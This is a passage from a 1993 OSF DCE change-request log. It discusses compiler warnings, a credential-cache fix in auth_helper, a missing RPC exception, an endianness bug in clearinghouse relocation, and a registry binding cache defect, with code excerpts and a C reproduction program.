dubious tag declaration: struct logblk
		
     The header files op_list_defs.h, msgblk.h, and ncl_environment.h
     should be included to prevent a dubious tag declaration warning.

[09/22/93 public]
These complaints all seem to be about code like the following:
	foo(a1, a2)
	    struct foobar *a1;
	    struct foodle *a2;
	{
	    ...
	}
Where the structures are not defined in any of the #include'd header files.

This defect should be cancelled.  This is a valid, and very powerful, C
programming technique.  It's known as information hiding:  it is a clean
way of passing typed, yet opaque, pointers around.  The compiler warnings
are spurious; Stratus should fix their compiler.



CR Number                     : 8650
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : helper
Short Description             : auth_helper confuses creds on cached contexts
Reported Date                 : 9/22/93
Found in Baseline             : 1.0.2
Found Date                    : 9/22/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : open

[9/22/93 public]
Here is the information from our bug database regarding this defect.
The problem is that if the first file access that generates the call
to auth helper (dfsbind) is under an su process then the euid saved in
the cache context does not reflect the real owner of the ticket.
The code change is included at the end.
abstract      auth_helper confuses creds on cached contexts
duplicate     
notes:
    <Note by dstokes (Dawn C. Stokes), 93/09/07 18:47:44, action: open>
I have seen this a couple of times now, and Ken Walker just hit it in
the dceprod cell.  There seems to be a problem when you su back and
forth between non-root and root users while holding credentials.
You eventually starting getting failures indicating that you are
unauthenticated, but your creds are still valid.  Looking at the
dfstrace log:
time 543.103925, pid 0: Current time: Tue Sep  7 18:15:43 1993
time 543.103925, pid 17676: ERR: dfs: set auth binding failed (code 382312714),
running unauthenticated.
time 256.193075, pid 17676: ERR: dfs: set auth binding failed (code 382312714),
running unauthenticated.
time 390.927316, pid 17676: ERR: dfs: set auth binding failed (code 382312714),
running unauthenticated.
# dce_err 382312714
dce_err: 382312714: attempting to use credentials belonging to otheruser (dce /rpc)
I have hit it when trying to operate as a non-root, non-cell_admin user,
but then having to become root for some reason.  Ken hit it by dce_logging
prior to starting X windows, and then opening several windows, on of which
does an su root.
I intend to try to come up with a more finite sequences of steps for
reproducing this, but I decided to go ahead and open the defect so I
don't forget.
    <Note by dstokes (Dawn C. Stokes), 93/09/15 16:55:46, action: note>
Method for reproducing this bug:
rlogin host -l <non-root-user>
dce_login cell_admin -dce-
su root
cp -r data into DFS (I did a build export tree)
exit
ls -l directory being copied into
START_SYMPTOM
After dce_login'ing to the cell as a user and su'ing to another user, dfsbind
returns a creds error which the DFS client will present as:
dfs: set auth binding failed (code 382312714), running unauthenticated.
The creds have not expired at this time and should still be valid.
This seems to occur after several hours when several su's have been
attempted or a lot of file system activity has happened.
STOP_SYMPTOM
START_SOLUTION
Change the auth_helper code in get_context_from_pag() so that it avoids
looking in the cache at the euid's and verifies the context by
calling check_ownership() everytime to see who owns the ticket file.
STOP_SOLUTION
auth_helper.c:
-------------------
static int check_ownership (euid, slot, st)
    unsigned32 euid;
    int slot;
    error_status_t *st;
{
    int ret;
    struct stat stbuf;
    char tkt_file_path[1024];
    if (context_cache[slot].pag == 0) {
        *st = -1 /* XXX */;
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership pag is 0\n");
#endif /* OT */
        return -1;
    }
    sprintf (tkt_file_path, 
	SEC_LOGIN_CCACHE_FILE_FROM_PAG_FMT, context_cache[slot].pag);
    ret = stat (tkt_file_path, &stbuf);
    if (ret < 0) {
        *st = -1 /* XXX */;
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership stat failed on %s \n",tkt_file_path);
#endif /* OT */
        return -1;
    }
    if (!S_ISREG(stbuf.st_mode)) {
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership failed on %s, !S_ISREG\n",tkt_file_path);
#endif /* OT */
        *st = rpc_s_helper_wrong_user; /* not quite right */
        return -1;
    }
    if ((euid != 0) &&
        (stbuf.st_uid != euid))  {
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership failed on %s, euid %d, st_uid %d\n",	
	    tkt_file_path, euid, stbuf.st_uid);
#endif /* OT */
        *st = rpc_s_helper_wrong_user;
        return -1;
    }
    *st = error_status_ok;
    return slot;
}
.
.
.
static int  get_context_from_pag (pag, euid, login_context, st)
    unsigned32 pag;
    unsigned32 euid;
    sec_login_handle_t *login_context;
    error_status_t *st;
{
    int slot;
    *st = error_status_ok;
    slot = find_context_cache(pag);
    if (slot >= 0) {
	*login_context = context_cache[slot].context;
#ifdef OT /* 7237 */
	(void)check_ownership(euid, slot, st);
#else /* OT */
	if ((context_cache[slot].euid == euid) || (euid == 0)) {
	    (void)check_ownership(euid, slot, st);
	} else {
	    *st = rpc_s_helper_wrong_user;
	}
#endif /* OT */
	if (*st != error_status_ok) {
	    release_context_cache(slot, login_context);
	    slot = -1;
	}
    } else { /* no entry found in context cache */
.
.
.
.
.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `open'

[9/22/93 public]
There is a revision to the above change.  The revised changes are included below
static int check_ownership (euid, slot, st)
    unsigned32 euid;
    int slot;
    error_status_t *st;
{
    int ret;
    struct stat stbuf;
    char tkt_file_path[1024];
    if (context_cache[slot].pag == 0) {
        *st = -1 /* XXX */;
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership pag is 0\n");
#endif /* OT */
        return -1;
    }
    sprintf (tkt_file_path, 
	SEC_LOGIN_CCACHE_FILE_FROM_PAG_FMT, context_cache[slot].pag);
    ret = stat (tkt_file_path, &stbuf);
    if (ret < 0) {
        *st = -1 /* XXX */;
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership stat failed on %s \n",tkt_file_path);
#endif /* OT */
        return -1;
    }
    if (!S_ISREG(stbuf.st_mode)) {
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership failed on %s, !S_ISREG\n",tkt_file_path);
#endif /* OT */
        *st = rpc_s_helper_wrong_user; /* not quite right */
        return -1;
    }
    if ((euid != 0) &&
        (stbuf.st_uid != euid))  {
#ifdef OT /* ORB: 7237 */
        dprintf("check_ownership failed on %s, euid %d, st_uid %d\n",	
	    tkt_file_path, euid, stbuf.st_uid);
#endif /* OT */
        *st = rpc_s_helper_wrong_user;
        return -1;
    }
    *st = error_status_ok;
    return slot;
}
.
.
.
static int  get_context_from_pag (pag, euid, login_context, st)
    unsigned32 pag;
    unsigned32 euid;
    sec_login_handle_t *login_context;
    error_status_t *st;
{
    int slot;
    *st = error_status_ok;
    slot = find_context_cache(pag);
    if (slot >= 0) {
	*login_context = context_cache[slot].context;
#ifdef OT /* ORB:7237 */
	(void)check_ownership(euid, slot, st);
#else /* OT */
	if ((context_cache[slot].euid == euid) || (euid == 0)) {
	    (void)check_ownership(euid, slot, st);
	} else {
	    *st = rpc_s_helper_wrong_user;
	}
#endif /* OT */
	if (*st != error_status_ok) {
	    release_context_cache(slot, login_context);
	    slot = -1;
	}
    } else { /* no entry found in context cache */
	unsigned char import_buf[1024];
	error_status_t xst;
	int exists;
	/* Fetch the context and add it to the context cache */
	sprintf ((char *)import_buf, SEC_LOGIN_CCACHE_FROM_PAG_FMT, pag);
	dprintf ("Importing pag %x, `%s'\n", pag, import_buf);
	sec_login_import_context (strlen(import_buf)+1, import_buf, 
                              login_context, st);
	if (*st == error_status_ok) {
	    slot = add_context_cache(pag, euid, login_context, &exists, st);
	    if (*st == error_status_ok) {
		if (exists) {
		    /* 
		     * Another thread must have beat us to it, release our
		     * context and use the one returned from the cache.
		     */
		    dprintf("discarding duplicate ctx %x\n", *login_context);
                    sec_login_release_context (login_context, &xst);
		    *login_context = context_cache[slot].context;
		}
#ifdef OT /* ORB:7237 */
		(void)check_ownership(euid, slot, st);
#else /* OT */
		if ((context_cache[slot].euid == euid) || (euid == 0)) {
		    (void)check_ownership(euid, slot, st);
		} else {
		    *st = rpc_s_helper_wrong_user;
		}
#endif /* OT */
		if (*st != error_status_ok) {
		    release_context_cache(slot, login_context);
		    slot = -1;
		}
	    }
	} else {
	    dprintf("unable to import pag %x in `%s': status %x\n",
		pag, import_buf, *st);
	}
    }
    return slot;
}

[10/6/93 public]

I've gotten Rajendra's permission to integrate the
proposed fix for this problem.



CR Number                     : 8644
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds/child
Short Description             : Compiler warnings in cdsclerk code
Reported Date                 : 9/21/93
Found in Baseline             : 1.0.2
Found Date                    : 9/21/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/21/93 public]

The licensee reported the following compiler warning. They are the warnings
for automatic conversion between signed and unsigned entities. Warnings
indicate that when converting a signed to unsigned, there is chance of
compilication that a negativenumber may become a big positive number.

     clerk_prm.c
     -----------
          At line 165:

          if ((adr = EXT32(adr_p)) && (0 < len) && (len <= EXT16(&adr_p[4]))) {
               SHOULD BE REPLACED WITH
          if ((adr = EXT32(adr_p)) && (0 < len) && (len <= (int)EXT16(&adr_p[4]))) {


This fix is not good. If EXT16 (unsigned) returns big enough, converting to 
int may cause problem. Better declare len as unsigned too.

     clerkreadattribute.c
     --------------------
          At line 433:

          for (i = 0; i < value.tagged_union.wholeEntry_p->numberOfAttributes; i++) {
               SHOULD BE REPLACED WITH
          for (i = 0; i < (int)value.tagged_union.wholeEntry_p->numberOfAttributes; i++) {

Again, better declare i as the same type of 
value.tagged_union.wholeEntry_p->numberOfAttributes.



CR Number                     : 8641
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cds/adver
Short Description             : Compiler warnings in cds adver
Reported Date                 : 9/21/93
Found in Baseline             : 1.0.2
Found Date                    : 9/21/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/21/93 public]

The licensee reported the following compiler warnings. The licensee feels
strongly that OSF should address these warnings:

"I can summarize my group's feelings in few brief points:

- - OSF should provide warning free DCE code so that if we see new warnings we
  can adequately address the problem. We can't ignore them. Sorry!!

- - Portable code will help DCE customers like Stratus as we have to manage
  multiple hardware platforms with different architectures and compilers.

- - Since DCE has multiple releases and we want to see DCE improving so that
  our overhead in porting DCE is reduced every time we port new update, its in
  Stratus' best interest that the problems we find get fixed in a finite time
  frame and that the newer release of DCE reflects that fix.

- - It is annoying to see 2000 warnings when we build DCE and the real problem
  warning will hide between these 2000 stagnant warnings. It takes REAL time
  to check/trace if the warning is a real problem or not. We can't waste time
  doing the same thing over and over again.
"

Note, I don't agree all of their fixes. I will point out below.

Almost all warnings happen among automatic conversion between a signed
entity and an unsigned entity. Since by converting a signed one into
unsigned, there is chance that a negative number may become a big positive
number. Thus the compiler gives a warning. At times when a constant integer
is involved, the compiler should be smart enough to know that converting a
positive constant will NOT introduce the possible problem. But the compiler
used by the licensee obviously does not possess such a feature.

The following is reported by the licensee:

     adver_clerk_event.c
     -------------------
          At line 3298:

          for (i = 0; i < oldcle_p->ch_length; i++)
               SHOULD BE REPLACED WITH
          for (i = 0; i < (int)oldcle_p->ch_length; i++)


          At line 4190:

          for (i = 0; i < rpc_p->rpc_nscle.ch_length; i++) {
               SHOULD BE REPLACED WITH
          for (i = 0; i < (int)rpc_p->rpc_nscle.ch_length; i++) {


          At lines 4308 and 4337:

          for (i = 0; i < ch_p->ch_length; i++) {
               SHOULD BE REPLACED WITH
          for (i = 0; i < (int)ch_p->ch_length; i++) {


     adver_dacl.c
     ------------
          At line 885:

          for (i = 0; i < p->num_groups; i++) {
               SHOULD BE REPLACED WITH
          for (i = 0; i < (int)p->num_groups; i++) {

          At line 895:

          for (i = 0; i < p->num_foreign_groups; i++) {
               SHOULD BE REPLACED WITH
          for (i = 0; i < (int)p->num_foreign_groups; i++) {


     adver_service_ncl.c
     -------------------
          At lines 1400 and 1418:

          if (strlen(name_string)>SIMPLENAMEMAX) {
               SHOULD BE REPLACED WITH
          if ((int)strlen(name_string)>SIMPLENAMEMAX) {


     adver_sysdep_unix.c
     -------------------

          At line 584:

          okay = (strlen(sockname) <= K_MAX_SOCKNAME);
               SHOULD BE REPLACED WITH
          okay = ((int)strlen(sockname) <= K_MAX_SOCKNAME);


I would say a better way is to cast K_MAX_SOCKNAME into size_t:

	  okay = (strlen(sockname) <= (size_t)K_MAX_SOCKNAME);

[09/21/93 public]
There was recently another OT that dealt with similar issues.  I don't
remember the number -- Mr. Monzillo probably can.  I agree with Stratus's
sentiment that clean builds are the goal.  However, I disagree with the
fixes they suggest; I prefer what Ron suggested in the other OT.  I think
OSF DCE should have a consistent style for how to handle these things --
one component should not be adding casts while the other is changing the
types of loop variables.
     adver_clerk_event.c
     -------------------
     At line 3298:
	 for (i = 0; i < oldcle_p->ch_length; i++)
Rather than adding (int), it is probably more proper to declare i to be
the appropriate unsigned type.  Suppose ch_length becomes more than could
fit in an int?

I do agree with Wei-Dong that strlen() should not be casted, but that the
other side of the relational should be.



CR Number                     : 8640
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : mx300
S/W Ref Platform              : sinix
Component Name                : cds
Subcomponent Name             : 
Short Description             : Macro redefinition on SVR4
Reported Date                 : 9/21/93
Found in Baseline             : 1.0.2
Found Date                    : 9/21/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/21/93 public]

Licensee reported the following problem on SVR4 system:

     adver_sysdep_unix.c (cds/aver/adver_sysdep_unix.c)
     -------------------
          The header file nl_types.h should be included directly after
          dtssdef.h to eliminate a macro redefinition.  

"/usr/include/limits.h", line 126: warning: macro redefined: NL_SETMAX
"/usr/include/limits.h", line 127: warning: macro redefined: NL_TEXTMAX

	  Thus, the block of
          includes should look like:

          #include <que.h>
          #include <dtssdef.h>
          #include <nl_types.h>
          #include <dtssmacros.h>
          #include <sysdep.h>
          #include <dnsadverdef.h>
          #include <dns_strings.h>

Verifying with sni2 indicates that both limits.h and nl_types.h define the
two constants. In nl_types. There is a "#ifndef NL_SETMAX" in nl_types.h, that
is why it should be included later.

Other reference platforms (rios, osf/1, and hp-ux) all define NL_SETMAX
once in <limits.h>.



CR Number                     : 8639
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : CL rpc does not generate rpc_x_unsupported_protect_level exception
Reported Date                 : 9/21/93
Found in Baseline             : 1.0.2
Found Date                    : 9/21/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/21/93 public]
According to "Application Development Reference", all the RPC error status (ie.
rpc_s_...) will have corresponding exception (ie. rpc_x_...). In current rpc
runtime, the CL rpc does not generate rpc_x_unsupported_protect_level exception
when it gets rpc_s_unsupported_authn_level (or rpc_s_unsupported_protect_level)
error status. While doing a des/non-des testing (simply using perf test case),
I can get the correct rpc_x_unsupported_protect_level exception raised when the
test case was using CO rpc packet privacy level on non-des. However, I will get
an unknown exception raised if I am running CL rpc on non-des DCE. Both CL and
CO are returning correct error status (ie. rpc_s_unsupported_protect_level) if
it gets the unsupported protection level required. Only the exception generated
in CL is wrong. 

After investigating the code, I found several places that need to be changed to 
add the correct rpc_x_unsupported_protect_level exception raised in CL:

 - In rpcexc.h (in sys_idl): need to add the rpc_x_unsupported_protect_level 
   declaration.
 - In dgexec.c and dgclsn.c (in rpc runtime): need to add the corresponding NCA 
   <-> RPC error status mapping (nca_s_unsupported_authn_level <-> 
   rpc_s_unsupported_authn_level). 
 - In sscmaset.c (in stub runtime): need to add the convertion from error code
   (rpc_s_unsupported_authn_level) to exception (rpc_x_unsupported_protect_level).


In addition, I also found that there are some additional code in sscmaset.c and 
dg.c may need to be changed as well, which is regarding to convert fault packet 
back and forth to local error code. This need to be looked into as well.



CR Number                     : 8626
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dts
Subcomponent Name             : dtscp
Short Description             : show counters in sorted order
Reported Date                 : 9/17/93
Found in Baseline             : 1.0.2
Found Date                    : 9/17/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/17/93 public]
I did a dtscp show all counters and got back a long list that's hard to
read.  It's even harder to compare it to the documentation since the
documentation lists the counters in alphabetical order and dtscp does not.

dtscp should list all counters, characteristics, etc. in sorted order.



CR Number                     : 8591
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Interoperability problem on clearinghouse relocation
Reported Date                 : 9/14/93
Found in Baseline             : 1.0.3
Found Date                    : 9/14/93
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/14/93 public]
The clearinghouse relocation between at486 and HP-UX failed because
hp_ux failed to correctly read the relocated clearinghouse checkpoint 
file which was created on at486 and the read cored dump. This bug echoes 
a interoperability problem. The following is part of
trace,
 >db_checkpoint_load(0x40333cd8->00000000-0000-0000-0000-000000000000)
 >sys_open_checkpoint(/opt/dcelocal/var/directory/cds/foster_cell#first_ch)
 >sys_read(/opt/dcelocal/var/directory/cds/foster_cell#first_ch.checkpoint0000000002,1,1)
 >dthread_lock(0x4009b650)
 >dthread_unlock(0x4009b650)
 >db_convert_init(4.0 -> 4.0)
  db_convert_init() - no conversion needed
 >db_dir_build_memory_record(0x40333cd8->00000000-0000-0000-0000-000000000000)
 >sys_read(/opt/dcelocal/var/directory/cds/foster_cell#first_ch.checkpoint0000000002,2,8)
 >sys_read(/opt/dcelocal/var/directory/cds/foster_cell#first_ch.checkpoint0000000002,10,134217720)
E sys_read(/opt/dcelocal/var/directory/cds/foster_cell#first_ch.checkpoint0000000002) read(14,-4096) error: Invalid argument
dns_free() memory guard word trashed

[9/14/93 public]
After looked into this problem, found that it is caused by the incomparable of
BIG_ENDIAN and LITTLE_ENDIAN machines. The HP workstation is a Big_endian 
machine and 486 is Little_endian machine, so that problem is not HP specific
or 486 specfic problem. Accordingly I changed the bug short descitption and 
Ref platforms.

To fix this problem, The marshalling and unmarshally are requested.
one of prossible solutions is to implement a new interface between cds servers, 
it could be a clearinghouse relocation command in cdscp, the client of the new 
interface read the relocated clearinghouse files and sends each entry of the 
files to the relate-to-server, and the server of the new interface receive 
and reassemble into  clearinghouse files one its side. In this way, the 
marshalling and unmarshalling are done automatically by IDL. [Thanks desai for
the discussion] 

Comments?



CR Number                     : 8588
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : caching problem in rca_site_bind
Reported Date                 : 9/13/93
Found in Baseline             : 1.0.3
Found Date                    : 9/13/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/rca/internal_binding.c
Sensitivity                   : public

[9/13/93 public]

Full Description:

	While evaluating a service call from Stratus, I noticed
some undesirable state dependent behavior in the routines sec_rgy_site_get
and sec_rgy_site_binding_get_info, which I traced to caching being done
by the routine rca_site_bind which is ultimately called as the result of a
call to sec_rgy_site_bind.

	The first argument to sec_rgy_site_bind identifies the registry
server to which you would like to bind. There are several alternate 
forms in which you can indicate/name the server you wish to bind to.

	0 length string passed as server name

	protocol tower identifying host on which server is located and how
        to contact server (e.g. ncadg_ip_udp:130.105.1.60,
        ip:130.105.1.60, or ip:hostname)

        /.: indicating any registry server in your cell

        /.../x indicating any server in cell x

        and maybe some additional ways I haven't yet discovered
			
In any case, I noticed that when you indicate your server by other than 
one of the protocol tower forms, a subsequent call to sec_rgy_site_get or
sec_rgy_site_binding_get_info will return the name of the bound registry
server as a CDS name (e.g. /.../tofino_cell/subsys/dce/sec/master). However,
after using one of the protocol tower site name formats, all subsequent
calls to either sec_rgy_site_get or sec_rgy_site_binding_get_info will
return the name of the bound site exactly as it was specified in the
call to sec_rgy_site_open. This format persists even if you use
sec_rgy_site_close and then reopen the site with one of the other formats.

after looking at the code in internal_binding.c it became clear that
the caching logic is the cause of the persistence of the protocol tower
server name form across a close and (re)open. The following segment of code
was apparently written under the assumption that when binding_cache_lookup
returns true, the site name stored in the cached_context will be the same
as the site name passed to binding_cache_lookup. In practice this turns out
not to be the case.

/*
     * check our cache.
     */
    
    if (binding_cache_lookup(site_name, auth_info,
	(unsigned_char_p_t)princ, cell_name, &new_context))
    {
	SEC_DBG_GPRINTF(("returning cached context %x\n", new_context));
	*context = (sec_rgy_handle_t) new_context;
	CLEAR_STATUS(status);
	return;
    }

Repeat by:

use the following program to open the registry with a protocol tower format
site name, and then with a cell name such as /.:. Then kill the program and
open the registry with a cel name (e.g. /.:).

#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <dce/rpc.h>
#include <dce/binding.h>
#include <dce/pgo.h>
#include <dce/dce_error.h>

char *GetDceError(ErrorCode,DefaultMessage,ErrorBuffer)
  error_status_t ErrorCode;
  char           *DefaultMessage;
  char           *ErrorBuffer;
{
  int            Status;
  char           *Rvalue;
  dce_error_inq_text(ErrorCode,(unsigned char *)ErrorBuffer,&Status);
  if (Status == 0) Rvalue = ErrorBuffer;
  else Rvalue = DefaultMessage;
  return Rvalue;
}

void ReportResult(FunctionName,ErrorCode,DefaultMessage)
  char           *FunctionName;
  error_status_t ErrorCode;
  char           *DefaultMessage;
{
  char ErrorBuffer[dce_c_error_string_len];

  fprintf(stdout,"%s(%d): %s\n",FunctionName,ErrorCode,
      GetDceError(ErrorCode,DefaultMessage,ErrorBuffer));
}

void main()
{
  unsigned_char_t    site_name[sec_rgy_pname_t_size];
  unsigned_char_p_t  bound_site_name;
  unsigned32         status;
  sec_rgy_handle_t   context;

  do
  {
    do 
    {
      printf("\nEnter the name of registry site you wish to bind to\n");

    } while (gets((char *)site_name) == NULL);

    printf("Binding to registry site:'%s'\n", (char *)site_name);

    sec_rgy_site_open(site_name, &context, &status);

    ReportResult("sec_rgy_site_open",status,"succeeded");

    if (status == error_status_ok)
    {
      sec_rgy_site_get(context, &bound_site_name, &status);
      ReportResult("sec_rgy_site_get",status,"succeeded");
      if (status == error_status_ok)
      {
        printf("bound to site '%s'\n", (char *)bound_site_name);
        free(bound_site_name);
      }
      sec_rgy_site_close(context, &status);
      ReportResult("sec_rgy_site_close",status,"succeeded");
    }

  } while (1);
}

Proposed Solution:
 
At the time of an initial bind (no matching entry in cache) using a server
name in protocol tower format, the name that is stored in the newly created
cache entry should be the CDS name of the corresponding registry server
(not the protocol tower). Doing so, would eliminate the reliance on the 
"names are the same" assumption mentioned above, since only the CDS name
for a registry server would ever be stored as the ccahed server name.

Alternatively, if it is not possible or efficient to transform a site name
in protocol tower format into the CDS name of the corresponding registry
server, then in the code fragment listed above, the site name should be
updated in the cache, each time the cache entry is reused. Furthermore, if
this turns out to be necessary, the documentation for sec_rgy_site_get and
sec_rgy_site_binding_get_info should be modified to indicate that there is
some variability in what these routines return.



CR Number                     : 8585
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : ANSI C compiler warnings for several files in server directory.
Reported Date                 : 9/11/93
Found in Baseline             : 1.0.2
Found Date                    : 9/11/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : in directory/cds/server back_collect.c, back_gather_updates.c, back_ground.c, back_propagate.c back_replicas.c, back_skulk.c, back_spread.c, cds_dacl.c, db_btree.c, db_checkpoint.c, db_common.c, db_conversion.c, db_diags.c, dump_navigator.c, names_lib.c, rpc_dispatch.c, sdi_ui.c, sets_lib.c, ta_delete.c, ta_mgmt.c, ta_read.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/11/93 public]

The following comparisons between signed and unsigned types cause compiler
warnings (in directory/cds/server):

back_collect.c:

	in check_replicas() [line# ~128]

	for (pos = 0; pos < NUM_DBSet(replica_set_p); pos++)

	in collect_data() [line# ~291]

	for (cnt = 0; (cnt < NUM_DBSet(replica_set_p)) &&

back_gather_updates.c:

	in find_update() [line# ~296]

	while (up_p->att_index < NUM_DBSet(main_p))

	and [line# ~317]

	else if (NUM_DBSet(set_p) <= up_p->val_index)

	and [line# ~335]

	for (; up_p->val_index < NUM_DBSet(set_p); up_p->val_index++)

back_ground.c:

	in background() [line# ~1021]

	for (pos = 0; pos < NUM_DBSet(chset_p); pos++)

back_propagate.c:

	in back_propagate() [line# ~301]

	for (index = 0; index < NUM_DBSet(set_p); index++)

back_replicas.c:

	in fix_replica_ptr() [line# ~217, ~271]

	for (i = 0; i < NUM_DBSet(replica_set_p); i++)

back_skulk.c:

	in back_pseudodir_updates() [line# ~1594]

	for (pos = 0; pos < NUM_DBSet(chset_p); pos++)

back_spread.c:

	in spread_dead_replica() [line# ~174]

	for (cnt = 0; cnt < NUM_DBSet(replica_set_p); cnt++)

	in check_dead_replica() [line# ~382]

	for (cnt = 0; cnt < NUM_DBSet(set_p); cnt++)

cds_dacl.c:

	in dacl_resolve_ep() [line# ~1897]

	for (index=0; index<NUM_DBSet(set_p); ++index) {

db_btree.c:

	in build_delete_holder() [line# ~1538]

	for (pos = 0; pos < set_p->ds_ocnt; pos++)

db_conversion.c:

	in cvt_v2_ssb_att_set() [line# ~401]

	for (x = 0; x < offset_count; x++) {

	in cvt_v2_ssb_set_of_sets() [line# ~534]

	for (x = 0; x < offset_count; x++) {

db_diags.c:

	in db_diag_dump_file_info() [line# ~229, ~330, ~338, ~354, ~362]

	if (strlen(out) > 64) {

dump_navigator.c:

	in emit() [line# ~252]

	while (strlen(i_value) > output_max) {

	and [line# ~265]

	while (strlen(h_value) > output_max) {

names_lib.c:

	in name_s_compare [line# ~434]

	if (q_cnt > EXT8(name1_p->sn_length)) return(FALSE);

rpc_dispatch.c:

	in view_pac() [line# ~446]

	for (i = 0; i < p->num_groups; i++) {

	and [line# ~455]

	for (i = 0; i < p->num_foreign_groups; i++) {

	in cds_ReadAttribute() [line# ~1522]

	for (i = 0; i < value_p->tagged_union.wholeEntry_p->numberOfAttributes; i++) {

sdi_ui.c:

	in mgmt_command() [line# ~1678]

	if (strlen(namespace_name) > 50) {

	and [line# ~1683]

	if (strlen(ch_name) > 50) {

sets_lib.c:

	in val_set_check() [line# ~217]

	for (i=0; i< set_p->ds_hcnt; i++) {

	and [line# ~223]

	for (i=0; i< set_p->ds_ocnt; i++) {

	in att_set_check() [line# ~288]

	for (i=0; i< set_p->ds_hcnt; i++) {

	and [line# ~294]

	for (i=0; i< set_p->ds_ocnt; i++) {

	in set_insert() [line# ~1381]

	for (i = 0; i < EXT8(newname_p->an_length); ++i)

	in prn_DBSet() and prnDBSetA() [line# ~1506, ~1563]

	for (index = 0; index < NUM_DBSet_Delete(set_p); index++) {

ta_delete.c:

	in ta_delete_dir() [line# ~332]

	for (index = 0; index < NUM_DBSet(set_p); index++)

ta_mgmt.c:

	in mgmt_remove_dir() [line# ~649, ~668] and 
		mgmt_delete_ch() [line# ~796]

	for (pos = 0; pos < NUM_DBSet(chset_p); pos++)

ta_read.c:

	in read_chdirectory [line# ~274]

	for (; pos < NUM_DBSet(chset_p); ++pos)

Proposed Solution: in many of these instances the warning can be eliminated
by changing the declared type of the signed integer to unsigned. For
example, the index of a for loop ranging from 0 to a positive value should
be declared as unsigned. Even though in the couple of cases where an
unsigned is compared to a positive constant (taken to be int by the
compiler) a compiler should not complain (it could easily determine that
the comparison is always valid) some do (casting the constant to unsigned
[ugly as it is] makes the warning go away).

db_checkpoint.c:

	in db_checkpoint() [line# ~183]

	The argument to SERVER_WAIT_OR_BUGCHECK
	info_p->currop_sop_completed is of const dthread_cond_t pointer
	type conflicting with the type of the corresponding formal
	parameter of dthread_wait which	does not have a const qualifier.

db_common.c:

	in db_begin_operation() [line# ~2065] and 
		db_end_operation() [line# ~2127]

	file_p = db_find_file(chid_p);

	chid_p is of const ObjUID_t pointer type conflicting with the
	type of the corresponding formal parameter of db_find_file which
	does not have a const qualifier.


sdi_ui.c:

	in state_1() [line# ~1991]

	return (S1);

	can never be reached.

[09/28/93 public]
This will be done as part of meeting the code cleanup requirements during
1.1.



CR Number                     : 8581
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
